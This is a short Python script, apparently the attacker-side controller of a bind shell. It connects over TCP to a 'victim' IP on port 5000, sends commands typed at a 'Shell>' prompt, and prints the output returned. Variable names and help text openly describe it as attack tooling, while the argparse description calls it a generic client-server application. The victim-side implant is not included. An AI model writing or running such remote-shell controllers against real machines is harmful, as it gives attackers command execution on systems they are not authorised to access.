import socket
import sys
import argparse
from ipaddress import ip_address

def parse_args():
    parser = argparse.ArgumentParser(description="Client-server application using TCP attacker_sockets over the network")
    parser.add_argument('-i', '--ip', type=ip_address, required=True, help="IP to victim")
    return parser.parse_args()


def connect_to_server(ip, PORT):
    try:
        attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_sock.connect((str(ip), PORT))
        print(f"attacker_socket created and connected to {ip}:{PORT}")
        return attacker_sock
    except ConnectionResetError:
        print("Connection refused. Is the victim up")
        sys.exit(1)


def interactive_shell(attacker_sock, LINE_LEN):
    try:
        while True:
            cmd = input("Shell> ")
            if cmd.lower() in ['exit']:
                break
            attacker_sock.sendall(cmd.encode('utf-8'))

            response = b''
            while True:
                chunk = attacker_sock.recv(LINE_LEN)
                if b'EOF' in chunk:
                    response += chunk.replace(b'EOF', b'')
                    break
                response += chunk

            print(response.decode('utf-8'))  
    except KeyboardInterrupt:
        print("\nExiting Shell.")
    finally:
        attacker_sock.close()

def main():
    LINE_LEN = 4096
    PORT = 5000
    args = parse_args()
    attacker_sock = connect_to_server(args.ip, PORT)
    try:
        interactive_shell(attacker_sock, LINE_LEN)
    except Exception as e:
        raise e
    finally:
        if attacker_sock:
                attacker_sock.close()

if __name__ == "__main__":
    main()


